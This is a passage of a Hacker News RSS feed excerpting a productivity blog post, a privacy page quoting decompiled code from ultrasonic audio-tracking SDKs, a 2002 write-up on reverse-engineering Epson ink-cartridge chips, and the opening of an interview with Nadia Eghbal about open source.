            <link>https://shopify.engineering/great-code-reviews</link>
            <guid isPermaLink="false">hacker-news-small-sites-25054556</guid>
            <pubDate>Wed, 11 Nov 2020 01:31:01 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[What Helped me be more Productive as a Software Developer]]>
            </title>
            <description>
<![CDATA[
Score 7 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25054231">thread link</a>) | @strikingloo
<br/>
November 10, 2020 | https://www.datastuff.tech/programming/productivity-software-developer-student/ | <a href="https://web.archive.org/web/*/https://www.datastuff.tech/programming/productivity-software-developer-student/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-884" itemtype="https://schema.org/CreativeWork" itemscope="itemscope">
<div>

<div itemprop="text">

<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:site" content="@strikingloo">
<meta name="twitter:title" content="How I Stay Productive as a Software Developer">
<meta name="twitter:description" content="Imagine getting more stuff done, more effectively, in less time.">
<meta name="twitter:image" content="https://cdn.pixabay.com/photo/2020/11/04/19/22/windmill-5713337_1280.jpg">
<p>Imagine getting more stuff done, more effectively, in less time. That is how I will define productivity for the rest of this piece.</p>
<p>I’ve been reading a lot of productivity articles, tips, tricks and Twitter threads. In a way, doing so is the worst kind of procrastination, entropy for entropy’s sake. But every once in a while you’ll glean some gold nugget among the rubble, and it will all be worth it.</p>
<p>This is my attempt at recollecting what nuggets I found. On each section I will:</p>
<ul><li>Cite sources I found interesting or relevant.</li><li>Mention whether the methods have worked for me and what exact impact they’ve had.</li></ul>
<p>I will add a big caveat though: I think every person’s optimal productivity engine should be different. Thus, all of this advice should be taken, tested, and left to rot if it doesn’t work for you. And that pretty much applies to all other posts of this kind, in any blog ever, in my opinion.</p>
<p>Without further ado, here are the things I’ve seen actually work to make me get more stuff done, or stay less stressed.</p>
<h2>Reduce cognitive load</h2>
<p>Cognitive load is a beautiful term. It roughly means “How full is your mind’s RAM?”. </p>
<p>Whenever you’re thinking of the next 5 things you have to do, your groceries list, and whether you left the stove on, you’re carrying cognitive load.</p>
<p>It should be evident, but cognitive load stresses you out. Reducing it can help you better focus on your task.</p>
<p>Here’s what has worked for me on this account:</p>
<ul><li>Keep a clean room, office and desk<sup><a href="#fn1">1</a></sup>. You shouldn’t have trouble finding anything you use often, and the things you use the most often should be very easy to reach. This also applies to your filesystem, bookmarks system, etc. If you know you’ll want to check a certain link again in the future, bookmark it under an intuitive path. Don’t find yourself looking for it through your twitter feed.</li><li>If something’s on your mind and it’s not useful to keep thinking of it, <strong>write it down and forget it</strong>. You can look it up later. </li></ul>
<p>Take this article, for instance: instead of pestering myself thinking ‘You have to write that article!’ I just added an item on my Trello backlog that said ‘article on productivity’ and forgot about it until I had free time again and checked.</p>
<p>My own setup for task tracking is a combination of Trello for daily/weekly tasks and a Google sheet for long term stuff -like a deferred backlog- but really, every person has their own perfect combination of tools and processes. Find your own. </p>
<p>I know many people who prefer physical post-its, or a board. I’d rather get the portability of a browser app and the tracking for future reference. This is especially good if you also practice journaling, because then it’s just “What did I do today? Oh ok I’ll check today’s cards”. Still, your mileage will vary, so try many things and see what works best for you.</p>
<h2>Keep productive habits</h2>
<blockquote><p>…Watch your actions, they become your habits; watch your habits, they become your character; watch your character, it becomes your destiny.”</p><cite><em>―&nbsp;</em><strong>Lao Tzu</strong></cite></blockquote>
<p>Some people recommend this book called “Atomic Habits”. I won’t lie, I haven’t read it. But I read a good summary on reddit and agree with most of it, thought I was already kind of doing most of what it talks about.</p>
<p>The gist of it is: don’t try to build productivity on its own, build systems that incentivize you to be productive.</p>
<p>Some people use pomodoros, others prefer to put on noise-blocking headphones; I personally prefer to hide my cell phone until I have got enough stuff done. </p>
<p>My technique for this is simple: every month, (or use whatever time frame works for you), I decide which routines I will keep.</p>
<p>Right now for instance, my routines are:</p>
<ul><li>Exercise 4 times a week.</li><li>Do everything I have to for work and school, obviously.</li><li>Journal every night</li><li>2 hours of Japanese study every day</li></ul>
<p>The painful side of having a very clear set of goals and habits is: you’re extremely accountable to them. Is the day ending and you haven’t done your daily study session? You better get down to it right now. </p>
<p>In my case, my own conscience is a harsh enough mistress, but if you are not that hard on yourself when your to-do lists have uncrossed items, you may want to try something like </p>
<ul><li>Asking your SO to make passive aggressive remarks to you if you don’t finish your tasks.</li><li>Reward yourself with something sweet.</li><li>Going full monk-mode and forfeiting cell phone time until everything is done.</li></ul>
<p>Now for the flip side: you’re accountable for your tasks, yes, but you also set them. So whenever you define what your habits will be, don’t overestimate yourself. It’s better to have realistic, achievable goals that fall a bit short of your <em>maximum effort</em>, than it is to overstep, burn out or just not build the habits because you can’t keep up with them. </p>
<p>Did you underestimate your time management skills and now you’re doing everything you planned for <em>and</em> then get a lot of free time anyway? Cool! You get to feel productive <em>and</em> have free time. </p>
<p>You definitely don’t want to optimize for minimum free time. It sounds obvious, but I’ve caught myself and others doing this without realizing it.</p>
<p>The devil doesn’t always make work with idle hands.</p>
<p>Another thing about incentives: this ties to the “unclutter” rule I mentioned earlier, but do try to turn everything around you into a big <strong>habit-keeping engine</strong>. </p>
<p>For instance, if your goal is to read a book every week, have your book on sight and within arm’s reach at all times. Carry it on your suitcase/backpack, take it out instead of your cell phone when you want to procrastinate, etc. </p>
<p>You’ll be surprised by how much stuff you get done when <strong>everything around you is making you do it</strong>.</p>
<p>For a small guide on creating habits that I found interesting (though maybe more complicated than necessary) see <a href="https://www.lesswrong.com/posts/vE7Z2JTDo5BHsCp4T/instrumental-rationality-4-2-creating-habits">creating habits</a>.</p>
<h2>Don’t use your head for things a PC was made for</h2>
<p>Really though, remember what I said about cognitive load? Defining daily goals is not cool if you end up spending 5 minutes every hour thinking “ok what comes next? I already crossed my Chinese practice and my Economics lecture, what was the next item?”. </p>
<p>You want whatever system you build to be maintainable in the long run, so you should make it as easy to consult as possible, and not depend on a very fallible piece of architecture (your head).</p>
<p>So keep everything written down, on a nice .txt file, a Google doc, a sheet, etc. Use whatever you like, but not your head. Really it’s that simple, and it works. </p>
<p>(Aside: I am not going into detail into different tools or task tracking systems because honestly? There are like 20 different articles on this topic posted on HackerNews every week, and they’re all the same).</p>
<h2>Effective Note Taking</h2>
<p>This is all I have to say about note taking.</p>
<p>I am not a very note taking inclined person. I started this particular habit this year, and even though it <em>feels</em> productive, I don’t feel like I can quite say it has actually made me perform better yet.</p>
<p>So my first tip on this will be: <strong>don’t take notes if you don’t think it will be worth it</strong>. Some people retain information better when they take notes, I am not one of those people but if you are, then that piece of advice doesn’t apply to you. Remember when I said systems needed to be custom?</p>
<p>I also say this because I see there’s this trend in the internet of “write everything down, take all the notes!” and I think we’re tending towards an excessive “pro-notes-taking” bias, which may be unwarranted.</p>
<p>Secondly: if you are not writing everything down, how do you decide what should be kept? Well, I’m open to better ideas, but in my case I optimize for (estimated) <strong>future searchability</strong>: is what I just read, heard or watched something I am <strong>likely to think of in the future</strong>? And maybe I will want to recall it exactly and won’t be able to? Well then, into the notes it goes.</p>
<p>Note that it doesn’t need to be a relevant piece of information per se. I take notes about interesting history facts, anime trivia and weird Japanese words, not because they’ll come up in my final exams (fingers crossed) or, gods forbid, my job. I keep those quotes and facts around because they may come up in conversation.</p>
<p>Generally though, I think the category that makes the best notes is “things that I am likely to forget and look up again in the future, but I don’t care to learn by heart right now”. </p>
<p>This includes things like very specific facts about a domain, convoluted bash commands that you put into a script to not have to remember again (but want to persist somewhere else in case you want them on a different pc), or syntax details in a programming language.</p>
<p>I will be reading an article and think “oh, $FRIEND_X surely would find this very funny” and just write it down. And then I may send it to them through IM, but let’s be honest I could forget… until I reread my notes in the future.</p>
<p>Oh, the topic of rereading notes. This one is a tricky bit I haven’t mastered yet, and I am also open to suggestions in this area. Personally, I only reread notes on technical topics whenever they come up and I want to refresh my memory, and any other topic if I am thinking of it.</p>
<p>I know some people like to go through all of their notes every X time and they say it improves their creativity and gets the writing juices flowing. I am not super concerned about my creativity or writing right now (in case my one year posting-gap didn’t make that clear), but I will definitely experiment with that in the future (and write about it if I get any relevant results).</p>
<p>Lastly, I’ve recently been using a <strong>personal wiki</strong> for some of my notes (only the polished, public-facing ones), and it’s really cool, but it just reinforces point one: I feel like part of why I use a personal wiki is just that it feels nice, and I haven’t yet seen a lot of improvement over a simple Evernote or Google Docs. Maybe it’s a matter of scale and the effects won’t be apparent until a few years in? We will see.</p>
<h2>Anki and SRS for studying and productivity.</h2>
<blockquote><p><strong>Anki makes memory a choice</strong>, rather than a haphazard event, to be left to chance.</p><cite>Michal …</cite></blockquote></div></div></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.datastuff.tech/programming/productivity-software-developer-student/">https://www.datastuff.tech/programming/productivity-software-developer-student/</a></em></p>]]>
            </description>
            <link>https://www.datastuff.tech/programming/productivity-software-developer-student/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25054231</guid>
            <pubDate>Wed, 11 Nov 2020 00:47:08 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[PilferShush Jammer]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25054222">thread link</a>) | @karlzt
<br/>
November 10, 2020 | https://www.cityfreqs.com.au/pilfer.php | <a href="https://web.archive.org/web/*/https://www.cityfreqs.com.au/pilfer.php">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>
            Basic information about how the SDKs code function. They start with a call to the Android/Java API that deals with audio recording and playback. From there with a buffer array full of some audio data, it can then be sent to a native code library that is also installed as part of the SDK. These libraries handle the more CPU intensive work such as sifting through the data using various common methods (Goertzel et al) to find audio signals of interest. 
            </p><p>
            This first section shows some of the Android/Java function calls and parameters used.
            </p><p>
							<strong>alphonso</strong>
              <br>
              ALPHONSO_VERSION = "2.0.46";
              </p><pre>    private static final int RECORDER_AUDIO_BYTES_PER_SEC = 16000;
    private static final int RECORDER_AUDIO_ENCODING = 2;
    private static final int RECORDER_BIG_BUFFER_MULTIPLIER = 16;
    private static final int RECORDER_CHANNELS = 16;
    private static final int RECORDER_SAMPLERATE_44100 = 44100;
    private static final int RECORDER_SAMPLERATE_8000 = 8000;
    private static final int RECORDER_SMALL_BUFFER_MULTIPLIER = 4;
    public static final byte ACR_SHIFT_186 = (byte) 0;
    public static final byte ACR_SHIFT_93 = (byte) 1;
    public static final int ACR_SPLIT = 2;</pre>

              <p><strong>bitsound</strong>
              <br>
              VERSION_NAME = "v4.2.2"
              </p><pre>    public void a(int i) {
      try {
        this.d = new AudioRecord(6, this.b, 16, 2, i);
        if (this.d.getState() == 1) {
          try {
            this.d.startRecording();
            if (this.d.getRecordingState() != 3) {
              b.c(a, "Audio recording startDetection fail");
              this.d.release();
              this.e = false;
              return;
            }
            a(this.d);
            this.e = true;
            return;</pre>
            
              <p><strong>cifrasoft</strong>
              <br>
              VERSION_NAME = "1.0.3"
              </p><pre>    public static final int AUDIO_BUFFER_SIZE_MULTIPLIER = 4;
    public static final int AUDIO_THREAD_STOP_TIMEOUT = 3000;
    public static final int MAX_EMPTY_AUDIO_BUFFER_SEQUENTIAL_READS = 10;
    this.SAMPLE_RATE = 44100;</pre>
    
              <pre>    private int readAudioData(int currentPcmOffset, byte[] pcm) {
      AudioRecordService.handler.sendEmptyMessageDelayed(1, 3000);
      int result = this.mAudioRecord.read(pcm, currentPcmOffset * 2, this.bufferLength * 2);
      AudioRecordService.handler.removeMessages(1);
      return result;
    }</pre>

              <p><strong>copsonic</strong>
              <br>
              CORE_VERSION = "SonicAuth_CORE_v1.2.2.1";
              </p><pre>    "signalType": "ULTRASONIC_TONES",
    "content" : {
        "frequencies" : [ [18000, 20000, "TwoTones"] ]

    "signalType": "ZADOFF_CHU",
    "content": {
      "config": {
        "samplingFreq": 44100,
        "minFreq": 18000,
        "maxFreq": 19850,
        "filterRolloff": 0.5,
        "totalSignalTime": 0.3,
        "nMsgSymbols": 2,
        "filterSpan": 8
      },
      "set": {
        "centralFreq": 18925,
        "nElemSamples": 36,
        "nSymbolElems": 181</pre>

              <p><strong>dv (dov-e)</strong>
              <br>
              VERSION_NAME = "1.1.7"
              </p><pre>    private void recorderWork() {
      if (this.recordingActive) {
        int bytesReadNumber = this.myRecorder.read(this.myBuffer, 0, this.myBuffer.length);
        if (this.recordingActive) {
          DVSDK.getInstance().DVCRxAudioSamplesProcessEvent(this.myBuffer, 0, bytesReadNumber / 2);
        }
      }
    }</pre>
    
              <p><strong>fanpictor</strong>
              <br>
              VERSION_NAME = "3.2.3"
              </p><pre>    enum FNPFrequencyBand {
      Default,
      Low,
      High
    }
              </pre>

              <p><strong>fidzup</strong></p><pre>    a. this.frequency = paramBasicAudioAnalyzerConfig.frequency;   // 19000.0f
    b. this.samplingFrequency = paramBasicAudioAnalyzerConfig.samplingRate;    // 44100.0f
    c. this.windowSize = paramBasicAudioAnalyzerConfig.windowSize;   // 0x200 (512)
    d. /* pulseDuration = 69.66f */
    e. this.pulseWidth = Math.round(paramBasicAudioAnalyzerConfig.pulseDuration * (this.samplingFrequency / 1000.0F));
    f. this.pulseRatio = paramBasicAudioAnalyzerConfig.pulseRatio;   // 32.0f
    /* signalSize = 0x20 (32)
    g. this.signalPeriodPulses = paramBasicAudioAnalyzerConfig.signalSize;
    h. this.bitCounts = paramBasicAudioAnalyzerConfig.bitcounts;   // 0xb (11)</pre>         
            <pre>    paramf.a = 19000.0F;            
    paramf.b = 44100.0F;            
    paramf.c = 512;                 
    paramf.d = 69.66F;              
    paramf.e = 0.33333334F;         
    paramf.f = ((int)(paramf.d * 32.0F * 3.2F)); // 7133.184
    paramf.g = 32;                 
    paramf.h = new int[] { 15, 17, 19, 13, 11, 21, 23, 9, 7, 25, 27 };</pre>             

              <p><strong>fluzo</strong>
              <br>
              VERSION = "1.3.001"</p><pre>    this.p = jSONObject.getInt("frame_length_milliseconds");
    this.q = jSONObject.getInt("frame_step_milliseconds");
    this.r = (float) jSONObject.getDouble("preemphasis_coefficient");
    this.s = jSONObject.getInt("num_filters");
    this.t = jSONObject.getInt("num_coefficients");
    this.u = jSONObject.getInt("derivative_window_size");</pre>
    
              <p><strong>instreamatic</strong>
              <br>
              VERSION_NAME = "7.16.0"</p><pre>    private static final int BUFFER_SECONDS = 5;
    private static int DESIRED_SAMPLE_RATE = 16000;</pre>
 
              <p><strong>lisnr</strong>
              <br>
              VERSION_NAME = "5.0.1.1";
              </p><pre>    // LisnrIDTone          
    public long calculateToneDuration() {
        return ((long) (((double) (this.lastIteration + 1)) * 2.72d)) * 1000;
    }
    // LisnrTextTone
    public long calculateToneDuration() {
        return (long) (((this.text.length() * 6) * 40) + 1280);
    }
    // LisnrDataTone
    public long calculateToneDuration() {
        return (long) (((this.data.length * 6) * 40) + 1280);
    }
    AudioRecord audioRecord = new AudioRecord(0, d, 16, 2, 131072);</pre>  

              <pre>    ArrayAudioPlayer.this.audioOutput = new AudioTrack(3, ArrayAudioPlayer.this.samplerate, 4, 2, 16000, 1);
    ArrayAudioPlayer.this.audioOutput.play();
    int written = 0;
    while (!ArrayAudioPlayer.this.threadShouldStop) {
      try {
        if (ArrayAudioPlayer.this.buffer.getBufferLeftToRead() &gt; 0) {
          int size = ArrayAudioPlayer.this.buffer.getBufferLeftToRead();
          written += size;
          ArrayAudioPlayer.this.audioOutput.write(ArrayAudioPlayer.this.buffer.readFromBuffer(size), 0, size);
          } else {
            ArrayAudioPlayer.this.threadShouldStop = true;
          }
        } catch (IOException e) {
          e.printStackTrace();
        }</pre>
        
              <p><strong>moodmedia</strong>
              <br>
              getVersion() = "1.2.1";
              </p><pre>    b = new AudioRecord(5, 44100, 16, 2, Math.max(AudioRecord.getMinBufferSize(44100, 16, 2) * 4, 32768));
    this.b = Type.SONIC;
    this.b = Type.ULTRASONIC;
    if (num.intValue() == 44100 || num.intValue() == 48000)
    this.j.setName("Demodulator");
    this.k.setName("Decoder");
    this.l.setName("HitCounter");
              </pre>
 
              <p><strong>prontoly (sonarax)</strong>
              <br>
              VERSION_NAME = "4.2.0";
             </p><pre>    contentValues.put("time", cVar.a);
    contentValues.put("type", cVar.b.name());
    contentValues.put(NotificationCompat.CATEGORY_EVENT, cVar.c);
    contentValues.put("communication_type", cVar.d);
    contentValues.put("sample_rate", cVar.e);
    contentValues.put("range_mode", cVar.f);
    contentValues.put("data", cVar.g);
    contentValues.put("duration", cVar.h);
    contentValues.put("count", cVar.i);
    contentValues.put("volume", cVar.j);</pre>
    
              <p><strong>realitymine</strong>
              <br>
              getSdkVersion = "5.1.6";
              </p><pre>    this.e = AudioRecord.getMinBufferSize(44100, 16, 2);
    int i = this.e;
    this.d = new byte[i];
    this.c = new AudioRecord(1, 44100, 16, 2, i);</pre>

              <p><strong>redbricklane (zapr)</strong>
              <br>
              SDK_VERSION = "3.3.0";
              </p><pre>    AudioRecord localAudioRecord = new AudioRecord(1, 8000, 16, 2, 122880);
    if (localAudioRecord.getState() == 1) {
      this.logger.write_log("Recorder initialized", "finger_print_manager");
      this.logger.write_log("Recording started", "finger_print_manager");
      localAudioRecord.startRecording();</pre>

              <p><strong>runacr</strong>
              <br>
              release = "1.0.4"
              </p><pre>    int minBufferSize = AudioRecord.getMinBufferSize(11025, 16, 2);
    this.K = new AudioRecord(6, 11025, 16, 2, minBufferSize * 10);</pre>

              <p><strong>shopkick</strong></p><pre>    .field bitDetectThreshold:Ljava/lang/Double;
    .field carrierThreshold:Ljava/lang/Double;
    .field detectThreshold:Ljava/lang/Double;
    .field frFactors:Ljava/lang/String;
    .field gapInSamplesBetweenLowFreqAndCalibration:Ljava/lang/Integer;
    .field maxFracOfAvgForOne:Ljava/lang/Double;
    .field maxIntermediates:Ljava/lang/Integer;
    .field minCarriers:Ljava/lang/Integer;
    .field noiseThreshold:Ljava/lang/Double;
    .field numPrefixBitsRequired:Ljava/lang/Integer;
    .field numSamplesToCalibrateWith:Ljava/lang/Integer;
    .field presenceDetectMinBits:Ljava/lang/Integer;
    .field presenceNarrowBandDetectThreshold:Ljava/lang/Double;
    .field presenceStrengthRatioThreshold:Ljava/lang/Double;
    .field presenceWideBandDetectThreshold:Ljava/lang/Double;
    .field useErrorCorrection:Ljava/lang/Boolean;
    .field wideBandPresenceDetectEnabled:Ljava/lang/Boolean;
    .field highPassFilterType:Ljava/lang/Integer;</pre>
              <pre>    Java_com_shopkick_app_presence_NativePresencePipeline_setDopplerCorrectionEnabledParam
    Java_com_shopkick_app_presence_NativePresencePipeline_setHighPassFilterEnabledParam
    Java_com_shopkick_app_presence_NativePresencePipeline_setWideBandDetectEnabledParam
    Java_com_shopkick_app_presence_NativePresencePipeline_setNumPrefixBitsRequiredParam
    Java_com_shopkick_app_presence_NativePresencePipeline_setPresenceDetectNarrowBandDetectThresholdFCParam
    …</pre></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.cityfreqs.com.au/pilfer.php">https://www.cityfreqs.com.au/pilfer.php</a></em></p>]]>
            </description>
            <link>https://www.cityfreqs.com.au/pilfer.php</link>
            <guid isPermaLink="false">hacker-news-small-sites-25054222</guid>
            <pubDate>Wed, 11 Nov 2020 00:46:30 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Eddie's Ink Chip Hack (2002)]]>
            </title>
            <description>
<![CDATA[
Score 78 | Comments 22 (<a href="https://news.ycombinator.com/item?id=25054177">thread link</a>) | @userbinator
<br/>
November 10, 2020 | http://www.eddiem.com/photo/CIS/inkchip/chip.html | <a href="https://web.archive.org/web/*/http://www.eddiem.com/photo/CIS/inkchip/chip.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<tr>
<td>
<p lang="en-GB"><a href="http://www.eddiem.com/photo/CIS/cis.htm">My CIS page.</a></p></td>
<th>
<p lang="en-GB"><img alt="" src="http://www.eddiem.com/photo/CIS/inkchip/inkchip.JPG" name="Graphic2" width="401" height="400"></p></th>
<td>
<p lang="en-GB"><a href="http://www.eddiem.com/photo/printer/chipreset/resetchip.html">Part
				2 build your own reseter</a></p></td></tr>
<tr>
<td colspan="3">
<p lang="en-GB"><strong>What is a Intellidge ink chip.</strong><span size="5"><br>
</span>Epson fit
				small circuit boards to most of their ink cartridges. These
				record the amount of ink that is estimated to be in the
				cartridge. I read that the official epson line is that it is for
				the customers benefit and not an anti-refill device. Whether you
				believe this or not they are a bloody nuisance to anyone wanting
				to refill the cartridges or use bulk ink. It also stops people
				using old cartridges full of solvent for cleaning the heads.
				Another problem was early printer models didn't check if the
				cartridge had been changed while power was on. This was good if
				you wanted to trick the printer into copying a “full”
				chip to and empty one, however the reverse was also true and you
				could easily copy and “empty” one into your full
				one.<br>
They are just a small memory device holds 32 bytes of
				data, they do not measure real ink level and nor does the
				printer. The printer reads the chips on startup, estimates
				(sometimes badly) how much ink should have been used and writes
				this back at shutdown. They hold other data as well.<br>
So epson
				go to the trouble of fitting chips to cartridges and building all
				the extra sockets, wiring, electronics and software into the
				printer so you can use the computer to see the predicted level
				and it can stop you printing if it think you've used enough ink.
				High-end Canon's on the other hand make the inks tank clear so
				you can see and have optical sensor to detect emptiness. This
				make a lot more sense – unless you are making an
				anti-refill device that is. Canon almost got my business this
				time but nobody I could find has run pigment in them – too
				risky.<br>
To get around the chip problems someone usually end up
				producing read-only chip which always read full (for use with
				CIS) and chip reseters for those who want to refill. These are
				not available for 2100p at the time of writing as far as I can
				tell.<br>
Before ordering my 2100p I did my homework and it seemed
				fairly likely a chip reseter would become available at some point
				and read-only chips as well. I was also cocky enough to think I
				could crack it myself and I have. It didn't go quite as expected
				though.<br>
<strong>What do I want to do?</strong><br>
I want the easiest way
				to fool the printer into believing it has full cartridges present
				so I can build my CIS.<br>
<strong>What did I expect?</strong><br>
A logical
				interface for Intellidge is i2c (i squared c) or TWI (two wire
				interface). Then the chip could just be some standard i2c eeprom.
				The Intellidge have too many pads for this but I was hopeful.
				After that would could SPI or microwire – again this could
				use off the shelf parts. If the chips were micro-controllers then
				plain asynchronous serial would be my choice.<br>
<strong>I had a
				look.</strong><br>
To do this I use a AVR mega323 micro, I declined
				offers of logic analyzers being a homebrew type of guy. The 323
				has 2K of internal ram which is enough for some minimalist data
				logging. It was about $50AUS in parts ($30US) to make. I wired a
				cartridge to bring the signals out and took a quick look with a
				voltmeter.<br>
<strong>Nothing!</strong><br>
There was nothing there. I
				expected some power but no, the chips are only powered briefly
				when the are accessed. I used leds to get a rough idea what was
				what and hooked up the micro via resistors to give some degree of
				protection to the printer if I screwed up. The code in the micro
				was written is assembler and captured data sent via rs232 to my
				PC where I wrote a delphi program to display and process the
				data.</p></td></tr>
<tr>
<td colspan="3">
</td></tr>
<tr>
<td colspan="3">
<p lang="en-GB"><a href="http://www.eddiem.com/photo/CIS/inkchip/traces.html"><img alt="" src="http://www.eddiem.com/photo/CIS/inkchip/fastendsml.gif" name="Graphic5" width="615" height="213"></a><br>
<a href="http://www.eddiem.com/photo/CIS/inkchip/traces.html">Click
				here for more traces.</a></p>
<p lang="en-GB">This is the sort of thing I got. No
				protocol I ever seen. Obviously synchronous with bi-directional
				data, very short format. I was confused a little by how short it
				was - because I expect much better precision for the ink
				level.<br>
The traces seem to be.<br>
Top – some sort of sync
				line, this always goes low before the start of transmission.<br>
Next
				– power this goes low (off) between chip reads at printer
				startup but stays high during the shutdown – when data is
				written to the chip.<br>
Next – the clock, data is read of
				the rising edge and changed on the falling.<br>
Bottom –
				bi-directional data, the first 4 bits are always from printer to
				the chip, the rest depend on whether it is a read or write. LSB
				first (left).</p></td></tr>
<tr>
<td colspan="3">
<p lang="en-GB">Convert to binary and some patterns emerge.<br>
It
				was not real obvious how the chips were addressed or which bits
				encoded ink levels. Some more data when some ink had been used
				made it easier.</p>
<p lang="en-GB">Below is one chip being read at startup, there
				are 7 accesses one for each chip. Only 3 block have data –
				the other chips must be hooked to different data lines.</p>
<div lang="en-GB"><p><img alt="" src="http://www.eddiem.com/photo/CIS/inkchip/strtbinary.gif" name="Graphic6" width="818" height="45"></p></div></td></tr>
<tr>
<td colspan="3">
<p lang="en-GB">Below is the complete shutdown stream. Again we
				can only see 3 chips from here.</p>
<p lang="en-GB"><img alt="" src="http://www.eddiem.com/photo/CIS/inkchip/endbinary.gif" name="Graphic7" width="297" height="199"><br clear="left">
After
				printing a few bits near the beginning of the bit stream did
				change. It looks to me like the first 3 bits are the chip address
				the next is a write bit then the ink level, I get the feeling
				there aren't many bits used to encode it (later looks like 6).<br>
So
				– the top one shows 252 bits of data being read out of the
				chip.<br>
The first part of the shutdown shows just the ink level
				being read out, this is to check the same chip is there.<br>
The
				second part is the ink-level and some other stuff (printer serial
				number maybe) being written into the chip. Seeing I didn't use
				any ink the bit-stream is identical to the read except for bit 3
				– presumably the write bit.</p></td></tr>
<tr>
<td colspan="3">
<p lang="en-GB"><span size="5"><br>
Tuesday
				24 Sept 2002. I fooled the printer.</span></p></td></tr>
<tr>
<td colspan="3">
<p lang="en-GB"><img alt="" src="http://www.eddiem.com/photo/CIS/inkchip/spoofed.gif" name="Graphic8" width="381" height="363"><span size="3">The
				interesting thing about this screen grab is the black cartridge
				is really only two thirds full. I spoofed the printer by pulling
				the serial data line low during the time the ink level bits are
				being clocked out of the ink chip.<br>
This is means 6 bits
				starting at the 5'th bit in the stream.</span></p>
<p lang="en-GB"><span size="3">The first 3 bits appear to be the
				chip address, I guess the next is a read/write select. I used a
				AVR mega323 to detect the start of the serial transmission look
				for the address of chip1+read (black apparently) then pull data
				low for 6 clock edges. </span></p>
<p lang="en-GB"><span size="3">I'm sure I can reset 3 of the chips
				by tapping into chip1 signal. Reseting the rest will mean tapping
				into at least one more. </span></p>
<p lang="en-GB"><span size="3">The current set up is for
				experimentation only – it is not “the real thing”.</span></p>
<p lang="en-GB"><span size="3">Shorting the data to ground may be a
				bit drastic but it is only for a very brief time. I hoped the
				data line would be open collector but this doesn't seem to be the
				case.</span></p></td></tr></div></div>]]>
            </description>
            <link>http://www.eddiem.com/photo/CIS/inkchip/chip.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25054177</guid>
            <pubDate>Wed, 11 Nov 2020 00:41:43 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Nadia Eghbal on working (and writing) in public]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25053962">thread link</a>) | @jger15
<br/>
November 10, 2020 | https://www.thepullrequest.com/p/nadia-eghbal | <a href="https://web.archive.org/web/*/https://www.thepullrequest.com/p/nadia-eghbal">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><a target="_blank" href="https://cdn.substack.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Fa3b69c75-0c5b-4746-b998-5b41a1064a8d_900x1200.jpeg"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Fa3b69c75-0c5b-4746-b998-5b41a1064a8d_900x1200.jpeg" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/a3b69c75-0c5b-4746-b998-5b41a1064a8d_900x1200.jpeg&quot;,&quot;height&quot;:1200,&quot;width&quot;:900,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:399616,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/jpeg&quot;,&quot;href&quot;:null}" alt=""></a></p><p><em>                                                                                              Portrait by <a href="https://www.katiasobolski.com/">Katia Sobolski</a>.</em></p><p><strong>Nadia Eghbal is uniquely positioned to write about open source having spent almost two years in developer relations at the Alexandrian library of open source, GitHub. She then spent two years continuing her quasi-anthropological study of open source at Protocol Labs, and now works in writer relations at Substack (host of this publication). Her new book is <a href="https://www.amazon.com/Working-Public-Making-Maintenance-Software/dp/0578675862/">Working in Public: The Making and Maintenance of Open Source Software</a>, which like her career trajectory, starts in open source software but ends up grappling with larger issues of creators in an unbundled digital economy. </strong><em><strong><a href="https://pullrequest.substack.com/p/the-glory-of-achievement">The Pull Request</a></strong></em><strong><a href="https://pullrequest.substack.com/p/the-glory-of-achievement"> review is here</a>.</strong></p><p><em>AGM: My naive mental model of open-source was this almost communitarian kibbutz model. And yet, the big lesson from your book is that that’s not really how it works. </em></p><p>NE: Part of the reason why I wrote this book was because I feel like we've had this communitarian kibbutz kind of model, which you've identified, is the prevailing model that people understand in open source and that gets frequently talked about. And I think that narrative has kind of been owned by the likes of [Richard] Stallman or Eric Raymond or anyone who kind of remembers those early days of open source. And that model definitely still exists within the matrix of different community models. The ‘clubs’ are kind of like that, where everyone is rolling up their sleeves and there's lots of different active contributors. And then we also have  the ‘federations’ that are kinda like the really big open source projects that we're used to thinking about like Linux, but then there’s the rise of the ‘stadium’ model that is, I think, much newer.</p><p><a target="_blank" href="https://cdn.substack.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F8c16a1d6-74cc-4eab-9640-b6dd860b29cb_934x408.png"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F8c16a1d6-74cc-4eab-9640-b6dd860b29cb_934x408.png" 